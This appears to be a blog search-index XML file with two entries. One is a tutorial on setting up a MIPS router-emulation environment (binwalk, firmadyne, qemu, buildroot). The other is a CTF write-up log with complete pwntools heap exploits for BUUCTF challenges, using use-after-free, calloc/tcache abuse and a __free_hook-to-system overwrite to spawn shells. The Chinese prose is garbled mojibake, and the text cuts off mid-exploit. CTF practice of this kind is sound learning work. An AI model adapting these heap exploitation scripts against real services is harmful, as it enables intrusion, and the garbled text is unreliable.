<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>è·¯ç”±å™¨ç¯å¢ƒæ­å»º</title>
      <link href="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/"/>
      <url>/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<p>â€‹        <a id="more"></a></p><p>â€‹        å­¦vmpwnå­¦åˆ°è‡ªé—­ï¼Œé€†æŒ‡ä»¤å¤ªéš¾äº†ã€‚ã€‚ã€‚æ•´ç‚¹æ–°ä¸œè¥¿ç¼“è§£ä¸€ä¸‹ã€‚å¤§ä¸€å°±æƒ³å­¦iotå®‰å…¨ï¼Œç¯å¢ƒä¸€æ¥äºŒå»ä¹Ÿæ­äº†æœ‰å‡ æ¬¡ï¼Œä¸è¿‡è¦è¶Šè¿‡glibcçš„pwnç›´æ¥è·³åˆ°iotçš„pwnè¿˜æ˜¯ä¸å¤ªå¥½ï¼Œä¸€æ˜¯ctfæ¯”èµ›ä¸­glibcçš„pwnè¿˜æ˜¯æˆ˜å¿…å¾ˆå¤§çš„ï¼ŒäºŒæ˜¯æ‰“åŸºç¡€ï¼Œæœ€åæ‰¾å·¥ä½œäººä¹Ÿå¾—çœ‹ctfç»å†ä¸æ˜¯ï¼Ÿæœ€ç»ˆåœ¨å¤§äºŒä¸Šä¸­æ—¬å¼€å§‹å­¦pwnï¼Œåæ¥åˆå¼ƒäº†ä¸€æ®µæ—¶é—´ï¼Œè½¬å­¦web(<del>æˆ‘æƒ³æ—¥ç«™</del>ï¼)æœ€ç»ˆåœ¨å¯’å‡åˆé‡æ–°æ¡èµ·äº†pwnï¼Œåæ¥æ‰“äº†å‡ åœºæ¯”èµ›ï¼ŒNPUCTF,å®‰æ’æœˆèµ›ï¼Œå¸¸è§„çš„glibcçš„pwnæˆ‘è¿˜æ˜¯èƒ½åº”ä»˜åº”ä»˜çš„ï¼Œæ»¡æ€€æœŸæœ›çš„è¿æ¥De1CTFï¼Œå»å¹´æ˜¯ä½œä¸ºwebç‹—å‚èµ›ï¼Œä»Šå¹´æ˜¯ä½œä¸ºä¸€åªpwnğŸ•å‚èµ›ï¼Œç»“æœã€‚ã€‚ã€‚ã€‚æ‰“è‡ªé—­äº†ï¼Œç­¾åˆ°pwnæ˜¯cè‰¹ï¼Œå‰©ä¸‹çš„æ²¡ä¸€é“å¸¸è§„é¢˜ï¼Œä¸¤é“mipsï¼Œä¸€é“å®‰å“ï¼Œå’Œå»å¹´çš„pwnçš„éš¾åº¦å·®å¤ªå¤šäº†ã€‚ã€‚ã€‚ã€‚De1CTFä¹‹ååˆæ˜¯ç½‘é¼æ¯ï¼Œ18å¹´çš„ç½‘é¼æ¯pwnä¹Ÿæ¯”è¾ƒå¸¸è§„ï¼Œèµ›å‰æˆ‘è§‰å¾—å¦‚æœæ˜¯ä¸Šä¸€å±Šé‚£ç§éš¾åº¦æˆ‘è¿˜æ˜¯èƒ½åšçš„ï¼Œç»“æœå†æ¬¡è‡ªé—­ã€‚ã€‚ã€‚ç¬¬ä¸€æ¬¡æ¥è§¦vmpwnç«Ÿç„¶æ˜¯åœ¨ç½‘é¼æ¯ï¼Œç›´æ¥æ‡µé€¼ï¼Œä¸€é“ç¼–è¯‘å™¨pwnï¼Œä¸€é“vmpwnï¼Œä¸€é“ç›²pwnã€‚ã€‚ã€‚ä¸¤åœºæ¯”èµ›ä¹‹åæˆ‘æ·±åˆ»çš„è®¤è¯†åˆ°äº†æˆ‘æ˜¯ä¸ªfwï¼Œå¤ªè¾£é¸¡äº†ï¼ŒçŸ¥è¯†é¢å¤ªçª„ï¼ŒåŸºç¡€ä¸å¤Ÿæ‰å®ï¼Œä»…ä»…åªä¼šglibcä¸‹çš„å †æ ˆpwnå®Œå…¨ä¸å¤Ÿäº†ï¼Œè¦èµ°çš„è·¯è¿˜å¾ˆé•¿å¾ˆé•¿ã€‚ã€‚ã€‚ã€‚</p><p>â€‹       æ‰¯å¾—æœ‰ç‚¹è¿œäº†ï¼Œè¯´äº†ä¸€ä¸‹å­¦pwnçš„ä¸€äº›å†ç¨‹ï¼Œæ¥ä¸‹æ¥è¿›å…¥æ­£é¢˜ï¼Œè·¯ç”±å™¨ç¯å¢ƒæ­å»ºã€‚</p><p>â€‹        å‚è€ƒäº†æŒºå¤šå¤§å¸ˆå‚…çš„åšå®¢ï¼Œä»¥å‰éƒ½æ˜¯ç›´æ¥æ— è„‘å¤åˆ¶ç²˜è´´(<del>ç°åœ¨ä¹Ÿæ˜¯ï¼Œåªä¸è¿‡æ›´è°¨æ…åœ°å¤åˆ¶ç²˜è´´</del>)ã€‚</p><p>é¦–å…ˆæ˜¯å®‰è£…<strong>binwalk</strong>ï¼Œæœ‰ä¸¤ç§æ–¹æ³•</p><pre><code>æ–¹æ³•1:sudo apt-get install binwalk æ–¹æ³•2:git clone https://github.com/devttys0/binwalk.gitcd binwalksudo ./deps.shsudo python ./setup.py installsudo apt-get install python-lzmasudo -H pip install git+https://github.com/ahupp/python-magicsudo -H pip install git+https://github.com/sviehb/jefferson</code></pre><p>ç›´æ¥sudo apt-getæœ‰äº›åŒ…ä¼šå®‰è£…ä¸å®Œå…¨ï¼Œæ‰€ä»¥æ¨èæºç å®‰è£…</p><p>ç„¶åå®‰è£… <strong>firmadyne</strong>ï¼Œéœ€è¦å®‰è£…<strong>postgres</strong>æ•°æ®åº“</p><pre><code>sudo apt-get install postgresgit clone https://github.com/firmadyne/firmadynecd firmadyne/ &amp;&amp; sudo download.shsudo -u postgres createuser -P firmadyne  sudo -u postgres createdb -O firmadyne firmwaresudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema</code></pre><p>æ¥ä¸‹æ¥æ˜¯qemuï¼ŒæŒ‰ç…§H4loå¤§ä½¬çš„è¯´æ³•ï¼Œè¿‡é«˜ç‰ˆæœ¬æˆ–è€…è¿‡ä½ç‰ˆæœ¬åœ¨æŸäº›æƒ…å†µä¸‹ä¼šæŠ¥é”™ï¼Œæ¨è<strong>qemu2.4.0</strong>ç‰ˆæœ¬ï¼Œä¸‹è½½å‹ç¼©åŒ…æœ¬åœ°ç¼–è¯‘</p><pre><code>wget https://download.qemu.org/qemu-2.4.0.tar.xztar xvf qemu-2.4.0.tar.xz &amp;&amp; cd qemu-2.4.0/./configuremake -j8sudo make install</code></pre><p><strong>sasquatch</strong>å®‰è£…</p><pre><code>sudo apt-get install zlib1g-dev liblzma-dev liblzo2-devsudo git clone https://github.com/devttys0/sasquatchcd sasquatch &amp;&amp; sudo make &amp;&amp; sudo make install</code></pre><p><strong>äº¤å‰ç¼–è¯‘ç¯å¢ƒ buildrootå®‰è£…</strong></p><p>è¿˜æ˜¯è·Ÿç€hç‰›çš„æ–‡ç« æ¥ï¼Œå…ˆæŠŠæ‰€æœ‰åº“éƒ½è£…ä¸Š</p><pre><code>sudo apt-get install libncurs*wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2tar -jxvf buildroot-snapshot.tar.bz2cd buildroot/make cleanmake menuconfigsudo make</code></pre><p>hç‰›wgetçš„ç½‘å€æœ‰é—®é¢˜ï¼Œåº”è¯¥æ˜¯<strong>snapshot</strong>ï¼Œä»–å¤šåŠ äº†ä¸€ä¸ªsï¼Œæˆ‘å½“æ—¶å°±æ˜¯ä¸‹ä¸å¥½è¿™ä¸ªå‹ç¼©åŒ…ï¼Œåæ¥ç›´æ¥æœç´¢äº†ä¸€æ³¢ï¼Œæ‰å‘ç°é—®é¢˜æ‰€åœ¨</p><p><strong>make menuconfig</strong>ä¹‹åï¼Œä¼šå‡ºç°ä¸€ä¸ªGUIç•Œé¢ï¼Œè¿›å…¥<strong>Target option</strong>ï¼Œé€‰æ‹©<strong>Target Architecture Varient</strong>ä¸º<strong>Mips 32</strong>ï¼Œå°†<strong>Target Architecture</strong>é€‰ä¸º<strong>MIPS(little endian)</strong>,ä¿å­˜åé€€å‡ºåˆ°ä¸Šä¸€çº§ï¼Œè¿›å…¥<strong>Toolchain</strong>ï¼Œå°†<strong>Kernel Headers</strong>ä¿®æ”¹ä¸ºæœ¬æœºçš„kernelç‰ˆæœ¬å³å¯ï¼Œç„¶åä¿å­˜é€€å‡ºï¼Œç¼–è¯‘æ—¶é—´ä¼šæœ‰ä¸€ä¸ªå°æ—¶å·¦å³</p><p> <strong>gdb-multiarch</strong></p><pre><code>sudo apt-get install gdb-multiarch</code></pre><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜éœ€è¦å®‰è£…ä¸€ä¸‹mipsç‰ˆæœ¬çš„gccåŠå…¶ç›¸å…³ç»„ä»¶ï¼Œapt ä¸­å¯¹åº”çš„åŒ…åä¸º <code>gcc-mips-linux-gnu</code> ä¸ <code>gcc-mipsel-linux-gnu</code></p><pre><code>sudo apt-get install gcc-mips-linux-gnusudo apt-get install gcc-mipsel-linux-gnu</code></pre><p>å…¶ä¸­mips-linux-gnu-gccç”¨æ¥ç¼–è¯‘å¤§ç«¯åºç¨‹åºï¼Œmipsel-linux-gnu-gccç”¨æ¥ç¼–è¯‘å°ç«¯åº</p><p>æˆ‘ä»¬æ¥å†™ä¸€ä¸ªå°ç¨‹åºéªŒè¯ä¸€ä¸‹</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿™æ˜¯hç‰›çš„æ–‡ç« ä¸­çš„ä¸€ä¸ªç¨‹åº</p><p>é¦–å…ˆæˆ‘ä»¬ç”¨å°ç«¯åºç¼–è¯‘</p><pre><code>mipsel-linux-gnu-gcc demo.c -o demo -static</code></pre><p>é™æ€ç¼–è¯‘</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/1.jpg" alt=""></p><p>å¯ä»¥çœ‹å‡ºç¡®å®æ˜¯å°ç«¯åºé™æ€é“¾æ¥ï¼Œæ¥ç€æˆ‘ä»¬è¿è¡Œä¸€ä¸‹</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/2.jpg" alt=""></p><p>è¿è¡Œæ²¡é—®é¢˜ã€‚æˆ‘ä»¬å†ç”¨å¤§ç«¯åºç¼–è¯‘ä¸€ä¸‹</p><pre><code>mips-linux-gnu-gcc demo.c -o demo -static</code></pre><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/3.jpg" alt=""></p><p>ç¡®å®æ˜¯å¤§ç«¯åºé™æ€é“¾æ¥</p><p>æ¥ç€è¿è¡Œ</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/4.jpg" alt=""></p><p>æ— è¯¯</p><p>ç°åœ¨éƒ½æ˜¯é™æ€é“¾æ¥ï¼Œæˆ‘ä»¬å†åŠ¨æ€ç¼–è¯‘ä¸€ä¸‹</p><pre><code>mipsel-linux-gnu-gcc demo.c -o demo</code></pre><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/5.jpg" alt=""></p><pre><code>qemu-mipsel -L /usr/mipsel-linux-gnu/ ./demo</code></pre><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/6.jpg" alt=""></p><p>-Læ˜¯è¿æ¥æŒ‡å®šçš„libcåº“</p><p>è‡³æ­¤ï¼Œç¯å¢ƒå°±ç®—é…ç½®å®Œæ¯•ï¼Œè¿˜æœ‰ä¸€äº›gdbåŠ¨æ€è°ƒè¯•mipsæ–‡ä»¶çš„ï¼Œåé¢ä¼šå†æ›´æ–°</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯å¢ƒæ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFåˆ·é¢˜è®°å½•</title>
      <link href="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/"/>
      <url>/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-gyctf-2020-signin"><a href="#0x1-gyctf-2020-signin" class="headerlink" title="0x1.gyctf_2020_signin"></a>0x1.gyctf_2020_signin</h2><p>ç¯å¢ƒæ˜¯2.27.è¿™é¢˜çš„è€ƒç‚¹åœ¨äºï¼Œ<strong>calloc</strong>ä¸ä¼šä»tcacheä¸­å–chunkï¼Œè€Œæ˜¯ç›´æ¥ä»fastbinä¸­å–ï¼Œå¹¶ä¸”ä¼šå°†fastbinä¸­å‰©ä½™çš„chunké“¾å…¥tcache</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/1.jpg" alt=""></p><p>ç¨‹åºçš„æ¼æ´åœ¨äºdeleå‡½æ•°ä¸­ï¼Œæœ‰uafæ¼æ´,åŒæ—¶è¿˜å­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œå…ˆä½¿ç”¨<strong>calloc</strong>åˆ†é…ä¸€ä¸ªchunkï¼Œå¦‚æœ<strong>ptr</strong>ä¸ä¸º0ï¼Œå°±å¯getshell</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/2.jpg" alt=""></p><p>expå¦‚ä¸‹:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary<span class="token operator">=</span><span class="token string">'./gyctf_2020_signin'</span><span class="token comment" spellcheck="true">#io = process('./gyctf_2020_signin')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25777</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'gyctf_2020_signin'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#sleep(0.1)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>ptr<span class="token operator">=</span><span class="token number">0x4040c0</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io,'b calloc')</span>getshell<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å³å…ˆå°†tcacheå¡«æ»¡ï¼Œä¹‹åfreeä¸€ä¸ªchunkè¿›å…¥fastbinï¼Œæ¥ç€ä»tcacheç”³è¯·ä¸€å—ï¼Œç„¶åè°ƒç”¨åé—¨å‡½æ•°ï¼Œè§¦å‘callocï¼Œå°†ptrå¤„å†™å…¥å‰ä¸€ä¸ªtcacheçš„åœ°å€å³å¯getshell</p><h2 id="0x2-gyctf-2020-document"><a href="#0x2-gyctf-2020-document" class="headerlink" title="0x2.gyctf_2020_document"></a>0x2.gyctf_2020_document</h2><p>ç¨‹åºä¿æŠ¤å…¨å¼€</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/4.jpg" alt=""></p><p>å¢åˆ æŸ¥æ”¹å››ä¸ªåŠŸèƒ½ï¼Œ<strong>add</strong>åŠŸèƒ½æœ‰ç‚¹å†—é•¿ï¼Œä¸»è¦å°±æ˜¯åˆ†é…ä¸¤ä¸ªchunkï¼Œä¸€ä¸ªå¤§å°ä¸º<strong>0x20</strong>ï¼Œä¸€ä¸ª<strong>0x90</strong>ï¼Œå‰è€…çš„å†…å®¹ä¸ºåè€…çš„æŒ‡é’ˆå’Œä¸€ä¸ªæ ‡å¿—ä½ï¼Œè®°å½•è¯¥chunkæ˜¯å¦è¢«ä¿®æ”¹è¿‡(åªå…è®¸ä¿®æ”¹ä¸€æ¬¡)ï¼Œ<strong>0x90</strong>å¤§å°çš„chunkçš„æ•°æ®æ®µçš„å‰0x10å¤§å°è®°å½•<strong>name</strong>å’Œ<strong>sex</strong>ï¼Œå0x70è®°å½•<strong>information</strong></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/5.jpg" alt=""></p><p>æ¼æ´ç‚¹ä½äº<strong>dele</strong>å‡½æ•°ï¼Œ<strong>uaf</strong>æ¼æ´</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/6.jpg" alt=""></p><p>å¹¶ä¸”<strong>edit</strong>å’Œ<strong>show</strong>åŠŸèƒ½é€šè¿‡0x20å¤§å°chunkä¸­å­˜åœ¨çš„æŒ‡é’ˆæ¥è¿›è¡Œç›¸åº”æ“ä½œï¼Œè¿™ä¹Ÿå¯ä»¥åˆ©ç”¨.ç”±äºæˆ‘ä»¬å¯ä»¥åˆ†é…çš„chunkå¤§å°å›ºå®šä¸º0x20å’Œ0x90ï¼Œæ‰€ä»¥æ— æ³•æ”»å‡»<strong>malloc_hook</strong>,è¿™é‡Œé‡‡ç”¨æ”¹<strong>free_hook</strong>ä¸º<strong>system</strong>çš„æ”»å‡»æ–¹å¼ï¼Œexpå¦‚ä¸‹:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./gyctf_2020_document'</span><span class="token comment" spellcheck="true"># io = process('./gyctf_2020_document')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28239</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'gyctf_2020_document'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> data<span class="token punctuation">,</span> sex<span class="token operator">=</span><span class="token string">'F'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input name'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input sex'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sex<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'information'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">,</span> change<span class="token operator">=</span><span class="token string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'sex?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>change<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'information'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>__free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token 